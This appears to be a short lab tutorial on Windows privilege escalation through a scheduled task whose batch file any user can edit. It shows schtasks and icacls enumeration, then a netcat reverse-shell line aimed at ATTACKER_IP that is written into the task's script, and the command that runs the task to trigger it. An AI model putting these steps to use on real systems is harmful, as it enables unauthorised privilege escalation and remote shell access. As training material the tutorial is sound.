# Scheduled Tasks

## Check for a Vuln Schtask

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

```powershell
schtasks # list all schtasks
schtasks /query /tn $TASK_NAME /fo list /v # get info about one task

# output
Folder: \
HostName:                             PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "`Task to Run`" parameter which indicates what gets executed by the scheduled task, and the "`Run As User`" parameter, which shows the user that will be used to execute the task.

## Change schtask script

If our user can change the "`Task to Run`" executable, we can decide what the `taskusr1` user runs, leading to easy privilege escalation. Use `icacls` to check the file permissions on the executable:

```powershell
icacls c:\tasks\schtask.bat

# output 
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

We can see that the **BUILTIN\Users** group has full access (F) to the task's binary file. This allows us to modify the .bat file and add any payload we want. You can find `nc64.exe` in `C:\tools`. Let's modify the .bat file to create a reverse shell:

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

To manually run the scheduled task with taskusr1 privileges and get a reverse shell, use this command:

```
schtasks /run /tn vulntask
```

\


